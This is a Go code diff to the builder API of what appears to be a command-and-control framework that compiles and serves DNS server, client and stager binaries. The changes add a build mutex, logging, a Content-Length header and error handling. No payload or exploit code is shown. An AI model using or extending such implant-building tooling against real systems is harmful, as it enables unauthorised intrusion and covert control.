@@ -13,11 +13,17 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"sync"
 	"time"
 )
 
 const (
 	buildsDir = "/opt/unkn0wnc2/builds" // Directory to store compiled binaries
+)
+
+var (
+	// buildMutex prevents concurrent builds from interfering with each other
+	buildMutex sync.Mutex
 )
 
 // Builder request structures
@@ -58,6 +64,10 @@ func (api *APIServer) handleBuilderPage(w http.ResponseWriter, r *http.Request) 
 
 // handleBuildDNSServer builds a DNS server binary with provided configuration
 func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Request) {
+	// Acquire build lock to prevent concurrent builds from interfering
+	buildMutex.Lock()
+	defer buildMutex.Unlock()
+
 	var req DNSServerBuildRequest
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		api.sendError(w, http.StatusBadRequest, "invalid request body")
@@ -129,12 +139,16 @@ func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Reques
 	buildDir := filepath.Dir(binaryPath)
 	defer os.RemoveAll(buildDir)
 
+	fmt.Printf("✓ DNS server build completed: %s\n", binaryPath)
+
 	// Register DNS server in database ONLY after successful build
 	err = api.db.RegisterDNSServer(serverID, req.Domain, req.ServerAddress, apiKey)
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to register DNS server: %v", err))
 		return
 	}
+
+	fmt.Printf("✓ DNS server registered in database: %s\n", serverID)
 
 	// Save binary to builds directory
 	filename := fmt.Sprintf("dns-server-%s-%d", req.Domain, time.Now().Unix())
@@ -143,12 +157,20 @@ func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Reques
 		// Log but don't fail - still send the binary
 		fmt.Printf("Warning: failed to save build: %v\n", err)
 	} else {
-		fmt.Printf("Build saved to: %s\n", savedPath)
+		fmt.Printf("✓ Build saved to: %s\n", savedPath)
 	}
 
-	// Send binary as download
+	// Get file info for Content-Length header
+	fileInfo, err := os.Stat(binaryPath)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to stat binary")
+		return
+	}
+
+	// Send binary as download with proper headers
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"dns-server-%s\"", req.Domain))
+	w.Header().Set("Content-Length", fmt.Sprintf("%d", fileInfo.Size()))
 
 	file, err := os.Open(binaryPath)
 	if err != nil {
@@ -157,11 +179,21 @@ func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Reques
 	}
 	defer file.Close()
 
-	io.Copy(w, file)
+	written, err := io.Copy(w, file)
+	if err != nil {
+		fmt.Printf("Error streaming binary: %v\n", err)
+		return
+	}
+
+	fmt.Printf("✓ Binary sent successfully: %d bytes\n", written)
 }
 
 // handleBuildClient builds a client binary with provided configuration
 func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) {
+	// Acquire build lock to prevent concurrent builds from interfering
+	buildMutex.Lock()
+	defer buildMutex.Unlock()
+
 	var req ClientBuildRequest
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		api.sendError(w, http.StatusBadRequest, "invalid request body")
@@ -214,6 +246,10 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 
 // handleBuildStager builds a stager binary with provided configuration
 func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) {
+	// Acquire build lock to prevent concurrent builds from interfering
+	buildMutex.Lock()
+	defer buildMutex.Unlock()
+
 	var req StagerBuildRequest
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		api.sendError(w, http.StatusBadRequest, "invalid request body")
